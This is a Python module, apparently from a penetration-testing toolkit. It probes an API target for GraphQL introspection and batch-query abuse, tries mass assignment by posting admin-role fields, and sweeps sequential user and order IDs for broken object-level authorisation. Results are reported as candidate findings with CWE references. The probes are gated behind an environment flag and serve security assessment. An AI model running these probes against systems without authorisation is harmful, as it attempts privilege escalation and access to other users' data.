"""omega/offensive/offense/apispecial — GraphQL & REST API specialist.

GraphQL: introspection dump, batch-query abuse, alias flooding.
REST: mass-assignment probing (extra fields in POST), BOLA sweep on
object endpoints. All candidate-grade, OFFENSE-GATED (PTK_OFFENSE).
"""
import json
import os

__all__ = ["run_apispecial"]

_BOLA_PATHS = ["/api/v1/users/{n}", "/api/v1/orders/{n}",
               "/api/users/{n}", "/api/orders/{n}"]


def run_apispecial(target, fetch, auth_headers=None, id_range=15,
                   budget=40, log=None, gate_open_fn=None):
    """Probe GraphQL and REST API abuse classes at ``target``."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch):
        return {"note": "fetch adapter required"}
    headers = dict(auth_headers or {})
    findings = []
    probes = 0

    def post(body):
        nonlocal probes
        probes += 1
        try:
            return fetch(str(target), method="POST", body=body,
                         headers=headers)
        except TypeError:
            try:
                return fetch(str(target), method="POST", body=body)
            except Exception:
                return None
        except Exception:
            return None

    def text(resp):
        return (resp if isinstance(resp, str) else
                getattr(resp, "text", "") or "")

    # 1) GraphQL introspection
    introspection = json.dumps({"query":
                                "{ __schema { types { name } } }"})
    resp = post(introspection)
    body = text(resp)
    if resp is not None and "__schema" in body:
        findings.append({
            "title": "GraphQL introspection enabled",
            "severity": "LOW",
            "source": "apispecial/gql-introspection",
            "evidence": "__schema query returned the full type map",
            "location": str(target),
            "verification": "candidate",
            "manual_check": "disable introspection in production; "
                            "dump the schema and list sensitive types",
            "cwe": "CWE-200",
        })
        # batch query abuse
        batch = json.dumps([
            {"query": "{ __typename }"} for _ in range(20)])
        r2 = post(batch)
        if r2 is not None and "[" in text(r2)[:1] and \
                "__typename" in text(r2):
            findings.append({
                "title": "GraphQL batch/alias flooding accepted",
                "severity": "MEDIUM",
                "source": "apispecial/gql-batch",
                "evidence": "20-query array processed in one request",
                "location": str(target),
                "verification": "candidate",
                "manual_check": "check rate limiting; batched queries "
                                "enable mass extraction",
                "cwe": "CWE-770",
            })

    # 2) mass assignment: extra privileged fields
    mass = json.dumps({"username": "omegatest", "role": "admin",
                       "is_admin": True, "isAdmin": True})
    r3 = post(mass)
    if r3 is not None and getattr(r3, "status", 0) in (200, 201):
        findings.append({
            "title": "mass-assignment candidate: privileged fields "
                     "accepted on create",
            "severity": "HIGH",
            "source": "apispecial/mass-assignment",
            "evidence": f"POST with role/is_admin fields -> HTTP "
                        f"{getattr(r3, 'status', 0)}",
            "location": str(target),
            "verification": "candidate",
            "manual_check": "verify the created account actually holds "
                            "admin rights",
            "cwe": "CWE-915",
        })

    # 3) BOLA sweep on common API paths
    for tpl in _BOLA_PATHS:
        for n in (1, 2, 3):
            if probes >= budget:
                break
            probes += 1
            try:
                resp = fetch(str(target).rstrip("/") +
                             tpl.replace("{n}", str(n)),
                             headers=headers)
            except Exception:
                continue
            body = text(resp)
            st = getattr(resp, "status", 0)
            if st and 200 <= st < 300 and any(
                    m in body.lower() for m in ("email", "username",
                                                "order", "owner")):
                findings.append({
                    "title": f"BOLA candidate: {tpl} object {n} "
                             f"readable without ownership check",
                    "severity": "HIGH",
                    "source": "apispecial/bola",
                    "evidence": f"GET {tpl.replace('{n}', str(n))} -> "
                                f"HTTP {st} with object content",
                    "location": str(target),
                    "verification": "candidate",
                    "manual_check": "confirm the object belongs to "
                                    "another tenant/user",
                    "cwe": "CWE-639",
                })
                break

    if log:
        log(f"apispecial: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
